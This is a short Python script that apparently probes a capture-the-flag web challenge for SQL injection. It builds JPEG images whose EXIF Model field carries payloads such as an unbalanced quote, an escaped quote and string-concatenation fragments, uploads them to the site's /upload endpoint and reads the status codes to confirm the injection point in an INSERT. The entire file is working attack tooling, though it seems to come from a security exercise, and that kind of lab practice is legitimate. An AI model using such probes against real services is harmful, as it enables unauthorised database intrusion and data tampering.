# probe_exif_sqli.py — pin down the injection in the EXIF Model field
# pip install piexif pillow requests
from PIL import Image
import piexif, base64, requests

BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
MY_UID = "ea42cd39-001b-4fb5-a509-449322674687"

def build(model_value: str, path="probe.jpg"):
    Image.new("RGB", (400, 300), (100, 120, 140)).save(path, "jpeg")
    def dms(dec):
        d=int(dec); m=int((dec-d)*60); s=round((dec-d-m/60)*3600,4)
        return ((d,1),(m,1),(int(s*100),100))
    exif = {
      "0th": {piexif.ImageIFD.Make: b"Samsung",
              piexif.ImageIFD.Model: model_value.encode()},
      "Exif": {piexif.ExifIFD.DateTimeOriginal: b"2025:10:01 23:51:37"},
      "GPS": {piexif.GPSIFD.GPSLatitudeRef:b"S", piexif.GPSIFD.GPSLatitude:dms(41.13),
              piexif.GPSIFD.GPSLongitudeRef:b"W", piexif.GPSIFD.GPSLongitude:dms(71.31)},
    }
    piexif.insert(piexif.dump(exif), path)
    return "data:image/jpeg;base64," + base64.b64encode(open(path,"rb").read()).decode()

def send(model_value, desc="t"):
    payload = {"image": build(model_value), "description": desc, "user_id": MY_UID}
    r = requests.post(f"{BASE}/upload", json=payload)
    print(f"{desc:20} model={model_value!r:35} -> {r.status_code}")
    return r

send("GalaxyS25",       "baseline")        # expect 200
send("Galaxy'S25",      "single-quote")    # expect 500 (breaks INSERT)
send("Galaxy''S25",     "escaped-quote")   # 200 => '' is a valid escaped quote => classic string SQLi
send("Galaxy'||'X",     "concat")          # SQLite/Oracle string concat; 200 => concatenation worked
send("Galaxy'+'X",      "plus-concat")     # some engines
